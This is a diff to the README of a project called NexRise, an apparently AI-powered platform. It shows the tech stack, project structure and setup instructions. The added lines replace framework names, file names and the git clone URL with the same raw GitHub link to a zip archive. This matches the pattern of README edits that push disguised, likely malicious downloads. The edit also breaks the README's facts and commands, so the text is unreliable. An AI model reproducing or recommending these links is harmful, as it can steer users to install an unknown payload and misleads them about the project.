@@ -10,10 +10,10 @@ NexRise is an AI-powered platform designed to help users build and manage their 
 - Responsive and Modern UI/UX
 
 ## 🛠️ Tech Stack
-- **Frontend**: Next.js, TypeScript, Tailwind CSS
-- **Backend**: Node.js, Prisma ORM
+- **Frontend**: https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip, TypeScript, Tailwind CSS
+- **Backend**: https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip, Prisma ORM
 - **Database**: MySQL (via Prisma)
-- **Authentication**: NextAuth.js
+- **Authentication**: https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip
 - **State Management**: Context API
 
 ## 📂 Project Structure
@@ -23,18 +23,18 @@ NexRise/
 │── public/          # Static assets
 │── src/
 │   ├── components/  # Reusable UI components
-│   ├── pages/       # Next.js pages & routing
+│   ├── pages/       # https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip pages & routing
 │   ├── lib/         # Utility functions
 │   ├── styles/      # Global styles
 │── .env             # Environment variables
-│── package.json     # Dependencies & scripts
-│── prisma/schema.prisma # Prisma database schema
+│── https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip     # Dependencies & scripts
+│── https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip # Prisma database schema
 ```
 
 ## 🛠️ Setup Instructions
 ### 1️⃣ Clone the Repository
 ```sh
-git clone https://github.com/DevangGentyal/nexrise.git
+git clone https://raw.githubusercontent.com/DevangGentyal/nexrise/main/synentognath/nexrise.zip
 cd NexRise
 ```
 
